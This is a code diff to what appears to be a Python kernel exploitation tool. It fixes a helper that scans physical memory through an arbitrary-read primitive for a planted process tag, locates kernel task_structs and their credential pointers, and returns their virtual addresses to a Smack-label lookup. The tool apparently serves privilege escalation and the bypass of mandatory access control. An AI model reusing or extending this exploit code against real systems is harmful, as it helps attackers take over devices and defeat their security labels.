@@ -339,6 +339,11 @@ def find_tasks_by_tag_scan(rpc, tag=b"PHYSRPC1\x00", lo=TAG_SCAN_LO, hi=TAG_SCAN
     The task list is regularly unusable on this kernel, so when the fork/child
     walk fails we find candidate task_structs directly (tag at task+0x400) and
     let the label match in find_task_smack_by_name() pick the right one.
+
+    Returns kernel VIRTUAL addresses, like find_stub_task()/find_child_by_head():
+    find_task_smack_by_name() converts with phys() itself.  (Until 2026-10-31
+    this returned the physical address it had scanned, so the --scan fallback
+    read phys(PA) - a wrong frame - and could never match a task.)
     """
     out = []
     page = lo
@@ -350,14 +355,14 @@ def find_tasks_by_tag_scan(rpc, tag=b"PHYSRPC1\x00", lo=TAG_SCAN_LO, hi=TAG_SCAN
                 continue
             i = data.find(tag)
             while i >= 0:
-                task = (p + i - K.O_COMM) & 0xFFFFFFFF
+                task_phys = (p + i - K.O_COMM) & 0xFFFFFFFF
                 try:
-                    comm = rpc.read(task + K.O_COMM, 16).split(bytes([0]))[0]
-                    cred = rpc.read_u32(task + K.O_CRED)
+                    comm = rpc.read(task_phys + K.O_COMM, 16).split(bytes([0]))[0]
+                    cred = rpc.read_u32(task_phys + K.O_CRED)
                 except Exception:
                     comm, cred = b"", 0
                 if comm == tag[:-1] and T._kernel_ptr(cred):
-                    out.append(task)
+                    out.append(va(task_phys))
                 i = data.find(tag, i + 1)
         page += count * 0x1000
         batches += 1
